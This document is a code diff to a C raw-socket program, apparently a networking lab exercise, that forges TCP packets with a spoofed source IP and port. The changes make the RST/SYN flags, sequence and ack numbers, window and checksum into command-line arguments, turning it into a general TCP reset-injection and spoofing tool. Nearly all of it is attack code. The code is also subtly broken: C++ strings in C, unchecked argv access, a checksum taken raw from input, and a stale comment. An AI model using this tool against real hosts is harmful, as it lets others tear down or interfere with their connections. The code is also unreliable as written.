@@ -28,8 +28,23 @@ unsigned short csum_tcp(unsigned short *buf, int nwords) {
 	return ~sum;
 }
 
-int main (void)
+int main (int argc, char *argv[])
 {
+	if(argc<=1) {
+        	printf("Usage: <client_ip> <server_ip> <client_port> <rst_flag> <syn_flag> <window_size> <seq_num> <ack_num> <checksum>");
+        	exit(1);
+     	} 
+	
+	string client_ip = argv[1];
+	string server_ip = argv[2];
+     	int client_port = atoi(argv[3]);
+	int rst_flag = atoi(argv[4]);
+	int syn_flag = atoi(argv[5]);
+	int window_size = atoi(argv[6]);
+	int seq_num = atoi(argv[7]);
+	int ack_num = atoi(argv[8]);
+	int checksum = atoi(argv[9]);
+	
 	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
 	
 	if(s == -1)
@@ -49,17 +64,17 @@ int main (void)
 	
 	//Spoofed source IP (can be anything)
 	char source_ip[32];
-	strcpy(source_ip, "10.0.2.15");
+	strcpy(source_ip, client_ip); //Command line argument
 	
 	//Construct spoofed source IPv4 address
 	struct sockaddr_in ip4_source_addr;
 	ip4_source_addr.sin_family = AF_INET;
-	ip4_source_addr.sin_port = htons(52666); 
+	ip4_source_addr.sin_port = htons(client_port); //Command line argument 1
 	inet_pton(AF_INET, source_ip, &ip4_source_addr.sin_addr);
 	
 	//Real destination IP of the server
 	char dest_ip[32];
-	strcpy(dest_ip,"192.168.122.1");
+	strcpy(dest_ip,server_ip);
 	
 	//Construct real destination IPv4 address
 	struct sockaddr_in ip4_dest_addr;
@@ -83,17 +98,17 @@ int main (void)
 	//Fill in the tcp header fields
 	(*tcp_header).source = ip4_source_addr.sin_port;//Spoofed IP Port
 	(*tcp_header).dest = ip4_dest_addr.sin_port; //Real IP Port of server
-	(*tcp_header).seq = 2;
-	(*tcp_header).ack_seq = 0; //always 0 for a RST packet
+	(*tcp_header).seq = htonl(seq_num);
+	(*tcp_header).ack_seq = htonl(ack_num); //always 0 for a RST packet
 	(*tcp_header).doff = 5;	//tcp header size
 	(*tcp_header).urg=0;
 	(*tcp_header).ack=0;
 	(*tcp_header).psh=0;
-	(*tcp_header).rst=1;
-	(*tcp_header).syn=0;
+	(*tcp_header).rst= rst_flag;
+	(*tcp_header).syn= syn_flag;
 	(*tcp_header).fin=0;
-	(*tcp_header).window = htons(0); //window size
-	(*tcp_header).check = 0x8ca9; //Calculated correct checksum (with help of wireshark)
+	(*tcp_header).window = htons(window_size);
+	(*tcp_header).check = checksum; //Calculated correct checksum (with help of wireshark)
 	(*tcp_header).urg_ptr = 0;
 	
 	//Use IP_HDRINCL option to indicate IP headers are included in packet
